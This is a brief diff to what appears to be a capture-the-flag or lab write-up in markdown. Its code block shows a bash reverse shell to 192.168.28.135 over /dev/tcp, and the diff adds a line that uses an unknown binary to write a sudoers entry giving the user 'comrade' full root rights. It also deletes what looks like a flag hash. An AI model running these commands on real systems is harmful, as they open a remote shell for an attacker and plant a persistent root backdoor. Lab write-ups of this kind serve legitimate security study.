@@ -106,9 +106,8 @@ cron.!info,!debug
 ```
 watch -n1 'ls -l'
 /bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1
+/var/tmp/testbed/unknown /etc/sudoers 'comrade  ALL=(ALL:ALL) ALL'
 ```
-5feff04460d67d0139719503e72c8054
-
 
 
 
